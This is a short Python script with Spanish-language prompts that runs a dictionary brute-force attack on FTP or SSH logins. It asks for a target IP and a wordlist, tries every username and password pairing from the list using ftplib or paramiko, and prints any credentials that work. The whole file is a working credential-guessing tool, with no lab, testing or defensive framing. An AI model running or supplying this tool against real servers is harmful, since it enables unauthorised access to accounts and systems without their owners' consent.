import ftplib
import paramiko
import threading

ip = input("Ingrese la ip objetivo:\n")
conn_serv = int(input("    1)FTP\n    2)SSH\nQue servicio prefiere: "))
assert conn_serv == 1 or conn_serv == 2, "Opción no válida, inténtelo de nuevo"
if conn_serv == 2:
    Known_hosts_path = input('Ingrese la ruta hacia el archivo "Known_hosts": ')
f_path = input("Ingrese la ruta al diccionario:\n")

def FTP_conn(ip, dicc):    
    for user in dicc:
        for passwd in dicc:
            conn = ftplib.FTP(ip)
            try:
                conn.login(user, passwd)
                print(f"¡Conexión exitosa!\nUsuario: {user}\nContraseña: {passwd}")
                try:
                    conn.quit()
                    exit()
                except:
                    conn.close()
                    exit()
            except ftplib.error_perm:
                try:
                    conn.quit()
                except:
                    conn.close()

def SSH_conn(ip, dicc, Known_hosts_path):
    for user in dicc:
        for passwd in dicc:
            print(user, passwd)
            conn = paramiko.SSHClient()
            conn.load_host_keys(Known_hosts_path)
            conn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                conn.connect(ip, username=user, password=passwd)
                print(f"¡Conexión exitosa!\nUsuario: {user}\nContraseña: {passwd}")
                conn.close()
                exit()
            except paramiko.ssh_exception.AuthenticationException:
                conn.close()
            except ConnectionResetError:
                print("User:", user)
                exit()

try:
    with open(f_path, "r") as f:
        words = f.readlines()
        f.close()
except Exception:
    print("Hubo un error mientras se procesaba el archivo, Compruebe que la ruta es correcta y que contiene la extensión del archivo\nSaliendo...")
    exit()

wordlist = []
for word in words:
    wordlist.append(word.strip("\n"))
words = []

if conn_serv == 1:
    FTP_conn(ip, wordlist)
if conn_serv == 2:
    SSH_conn(ip, wordlist, Known_hosts_path)